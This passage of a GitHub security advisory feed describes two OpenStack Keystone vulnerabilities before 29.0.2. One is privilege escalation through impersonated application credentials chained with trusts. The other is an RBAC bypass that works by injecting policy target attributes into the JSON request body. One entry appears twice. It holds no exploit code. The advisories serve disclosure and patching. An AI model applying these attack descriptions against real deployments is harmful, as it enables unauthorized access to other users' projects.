        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. When combined with an application credential impersonation vulnerability, an attacker with the member role on a project can escalate to admin by chaining unrestricted application credentials with Keystone trusts. The impersonated token carries the victim's identity, which passes the trustor validation check. Keystone then validates the delegated roles against the victim's actual role assignments in the database, not the roles on the requesting token. This allows the attacker to create a trust delegating the victim's admin role to themselves. The trust persists independently, and additional trusts and application credentials can be created to maintain access. All actions are logged under the victim's identity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43000">https://nvd.nist.gov/vuln/detail/CVE-2026-43000</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148477">https://bugs.launchpad.net/keystone/+bug/2148477</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-43000">https://access.redhat.com/security/cve/CVE-2026-43000</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482826">https://bugzilla.redhat.com/show_bug.cgi?id=2482826</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-q623-f4j4-p4xj">https://github.com/advisories/GHSA-q623-f4j4-p4xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q623-f4j4-p4xj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Authorization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</id>
        <link href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f"/>
        <updated>2026-07-02T17:44:06.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone RBAC policy enforcer in enforce_call unconditionally merges the raw JSON request body into the policy enforcement dictionary via policy_dict.update(json_input.copy()), overwriting trusted target data that was previously set from database lookups. Because flask.request.get_json is called with force=True, this works regardless of Content-Type or HTTP method. Any authenticated user can inject arbitrary policy target attributes (e.g., user_id, project_id) into the request body to bypass RBAC checks and perform unauthorized operations on resources belonging to other users or projects. This was introduced in commit 5ea59f52 (Rocky/14.0.0).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42999">https://nvd.nist.gov/vuln/detail/CVE-2026-42999</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148398">https://bugs.launchpad.net/keystone/+bug/2148398</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-42999">https://access.redhat.com/security/cve/CVE-2026-42999</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482840">https://bugzilla.redhat.com/show_bug.cgi?id=2482840</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f">https://github.com/advisories/GHSA-2r23-2g6v-2m5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Authorization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</id>
        <link href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f"/>
        <updated>2026-07-02T17:44:06.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone RBAC policy enforcer in enforce_call unconditionally merges the raw JSON request body into the policy enforcement dictionary via policy_dict.update(json_input.copy()), overwriting trusted target data that was previously set from database lookups. Because flask.request.get_json is called with force=True, this works regardless of Content-Type or HTTP method. Any authenticated user can inject arbitrary policy target attributes (e.g., user_id, project_id) into the request body to bypass RBAC checks and perform unauthorized operations on resources belonging to other users or projects. This was introduced in commit 5ea59f52 (Rocky/14.0.0).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42999">https://nvd.nist.gov/vuln/detail/CVE-2026-42999</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148398">https://bugs.launchpad.net/keystone/+bug/2148398</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-42999">https://access.redhat.com/security/cve/CVE-2026-42999</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482840">https://bugzilla.redhat.com/show_bug.cgi?id=2482840</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f">https://github.com/advisories/GHSA-2r23-2g6v-2m5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
</feed>